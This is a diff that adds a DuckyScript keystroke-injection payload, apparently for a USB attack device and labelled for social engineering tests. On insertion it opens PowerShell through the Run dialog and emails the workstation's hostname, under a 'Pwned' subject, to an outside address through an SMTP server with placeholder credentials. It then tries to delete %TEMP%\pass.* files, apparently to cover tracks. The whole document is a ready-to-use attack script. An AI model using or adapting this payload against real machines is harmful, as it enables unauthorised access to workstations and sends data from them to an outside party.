@@ -1,0 +1,38 @@
+REM Create By LysXky
+REM This is a payload for social engineering tests
+DELAY 2000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 200
+REM you can enter a server email, e.g. smtp.gmail.com
+STRING $SMTPServer = 'smtp.emailserver.org'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+REM Next you must enter your credentials
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('email_sender@email.org', 'Your_Password');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'email_sender@email.org'
+ENTER
+STRING $ReportEmail.To.Add('email_receiver@email.org')
+ENTER
+STRING $ReportEmail.Subject = 'Pwned for ' + $(hostname)
+ENTER
+STRING $ReportEmail.Body = 'Hi strangers, Do or do not. There is no try. I Pwned this workstation ' + $(hostname)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+STRING del %TEMP%\pass.*
+ENTER
+DELAY 300
+STRING exit
+ENTER
